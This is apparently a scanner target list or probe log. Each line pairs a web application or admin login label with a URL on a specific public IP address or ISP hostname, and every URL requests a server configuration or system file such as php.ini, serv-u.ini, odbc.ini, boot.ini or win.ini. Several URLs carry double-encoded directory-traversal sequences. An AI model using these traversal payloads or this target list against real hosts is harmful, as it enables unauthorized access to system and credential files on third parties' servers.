PHPBTTracker,http://61-64-230-169-adsl-tpe.dynamic.so-net.net.tw/login/htmlmade.com/site/serv-u.ini
PHP - web,http://210-242-146-178.hinet-ip.hinet.net/login/lib/include/php.ini
ListMail Login - PHP,http://103.53.79.70/cgi-dos/preferences.ini
ColdFusion Administrator Login - PHP,http://103.53.79.70/php.ini
xams,http://210.63.253.186/login_out/fcgi-bin//................windows/win.ini
SFXAdmin - sfx_global,http://210.242.147.163/login/..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255Cboot.ini
PHP Advanced Transfer - web server status,http://210.242.147.174/login/webmail./exchange/odbc.ini
Microsoft Software upd?t? Services,http://210.242.148.156/loginadmin/..%25255c..%25255c..%25255c..%25255c..%25255c..%25255c..%25255c..%25255cboot.ini
"Login to @Mail - \""Big",http://210.242.148.164/login/perl/default.asp/preferences.ini
Metaframe - LOGREP - Log file reporting system,http://61.62.173.182/login/inc/install/preferences.ini
teamspeak - VitalQIP IP Management System,http://210.242.146.146/login/.br/perl/php.ini
i-secure v1.1,http://219.84.227.185/login/axis-cgi/perl/php.ini
"Web - \""album",http://210.242.145.186/login/perl/inc/netscape.ini
Default PLESK Page - Admin login,http://210.202.233.181/login/suse/file://suse/flashFXP.ini
rapidshare - Gateway Configuration Menu,http://61.62.173.151/login/phpsysinfo/perl/Activex/perform.ini
Usage Statistics for - WebLogic Server,http://210.203.16.186/login_admin/tools//%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255Cwindows/win.ini
xams,http://210.203.16.170/loginok/install/php.ini
EXTRANET,http://210.200.17.186/login_out/sQuery//..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255Cwindows/win.ini
